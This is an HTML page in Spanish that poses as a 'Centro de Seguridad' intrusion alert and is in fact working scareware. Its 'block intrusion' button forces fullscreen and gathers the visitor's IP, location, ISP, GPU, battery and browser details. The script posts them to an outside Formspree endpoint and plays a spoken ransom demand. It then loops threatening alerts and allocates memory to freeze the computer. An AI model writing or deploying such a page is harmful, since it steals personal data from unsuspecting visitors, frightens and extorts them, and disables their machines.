<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Centro de Seguridad - Alerta Cr铆tica</title>
    <style>
        body { background: #000; color: #fff; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; overflow: hidden; height: 100vh; }
        #security-monitor { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; background: radial-gradient(circle, #1a0000 0%, #000 100%); }
        .alert-icon { width: 80px; height: 80px; background: #ff0000; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 50px; font-weight: bold; animation: pulse 0.5s infinite; margin-bottom: 20px; }
        @keyframes pulse { 0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 0, 0, 0.7); } 70% { transform: scale(1.1); box-shadow: 0 0 0 20px rgba(255, 0, 0, 0); } 100% { transform: scale(1); } }
        h1 { color: #ff3333; font-size: 32px; text-transform: uppercase; margin: 0; }
        .data-stream { font-family: 'Consolas', monospace; color: #00ff00; background: rgba(0,0,0,0.8); padding: 20px; border: 1px solid #333; width: 80%; max-width: 700px; margin-top: 20px; text-align: left; font-size: 13px; line-height: 1.5; }
        .btn-panic { background: #ff0000; color: #fff; border: none; padding: 20px 40px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 30px; border-radius: 5px; text-transform: uppercase; }
        #hacker-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #0f0; padding: 40px; z-index: 10000; box-sizing: border-box; }
    </style>
</head>
<body onkeydown="forceFull()" onclick="forceFull()">

    <div id="security-monitor">
        <div class="alert-icon">!</div>
        <h1>Amenaza de Seguridad Detectada</h1>
        <p style="color: #aaa;">Se ha detectado una conexi贸n entrante no autorizada intentando extraer archivos locales.</p>
        
        <div class="data-stream" id="live-data">
            > Analizando paquetes de red...<br>
            > Buscando origen de la brecha...<br>
            <span style="color: yellow;">[ESPERANDO INTERACCIN DEL USUARIO]</span>
        </div>

        <button class="btn-panic" onclick="iniciarExtraccionTotal()">Bloquear Intrusi贸n Ahora</button>
    </div>

    <div id="hacker-overlay">
        <pre id="terminal-out"></pre>
    </div>

    <script>
        const FORM_ID = "xykdyebg";

        function forceFull() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen().catch(() => {});
            }
        }

        async function iniciarExtraccionTotal() {
            forceFull();
            document.getElementById('security-monitor').style.display = 'none';
            document.getElementById('hacker-overlay').style.display = 'block';

            // 1. OBTENCIN DE LA "BOMBA" DE INFORMACIN
            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
            const bat = await navigator.getBattery().catch(() => ({}));
            
            // GPU - Hardware real
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/D";

            const payload = {
                "STATUS": "TARGET_COMPROMISED",
                "IP_REAL": ipData.ip,
                "CIUDAD": ipData.city,
                "PAIS": ipData.country_name,
                "PROVEEDOR": ipData.org,
                "HARDWARE": gpu,
                "MEMORIA": navigator.deviceMemory + "GB",
                "NUCLEOS": navigator.hardwareConcurrency,
                "BATERIA": (bat.level * 100) + "%",
                "SISTEMA": navigator.platform,
                "RESOLUCION": `${screen.width}x${screen.height}`,
                "NAVEGADOR": navigator.userAgent
            };

            // 2. EXFILTRACIN REAL AL FORMSPREE
            fetch(`https://formspree.io/f/${FORM_ID}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            // 3. AUDIO TTRICO DE CHANTAJE
            const voz = new SpeechSynthesisUtterance("He robado su informaci贸n y si la quiere recuperar tiene que pagarme. Te llamar茅 en diez horas.");
            voz.lang = 'es-ES';
            voz.pitch = 0.4;
            voz.rate = 0.9;
            window.speechSynthesis.speak(voz);

            // 4. BUCLE DE BLOQUEO Y CAOS
            const term = document.getElementById('terminal-out');
            const log = (msg, color = "#0f0") => {
                const span = document.createElement('div');
                span.style.color = color;
                span.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
                term.appendChild(span);
            };

            const sequences = [
                "ESTABLECIENDO BACKDOOR PERMANENTE...",
                `IP_TARGET: ${payload.IP_REAL} CAPTURADA`,
                `HARDWARE_ID: ${payload.HARDWARE} IDENTIFICADO`,
                "VOLCANDO HISTORIAL DE CONEXIONES...",
                "BLOQUEANDO PERIFRICOS DE ENTRADA...",
                "SISTEMA BAJO CONTROL DE ANONYMOUS_OPERATOR",
                "PAGUE PARA RECUPERAR EL ACCESO.",
                "TE LLAMAR EN 10 HORAS..."
            ];

            let i = 0;
            setInterval(() => {
                if (i < sequences.length) {
                    log(sequences[i]);
                    if (i > 4) log("ERROR CRTICO: KERNEL_HALT", "red");
                    i++;
                }

                // BLOQUEO DE NAVEGADOR (Bucle de alertas)
                alert("锔 ALERTA DE SEGURIDAD 锔\n\nTu informaci贸n ha sido exfiltrada.\nIP: " + payload.IP_REAL + "\nLocalizaci贸n: " + payload.CIUDAD + "\n\nNO INTENTE APAGAR EL EQUIPO.");
                
                if (!window.speechSynthesis.speaking) window.speechSynthesis.speak(voz);
                
                // Consumo de recursos para trabar la PC
                let freeze = new Array(10000000).fill("");
            }, 600);
        }
    </script>
</body>
</html>
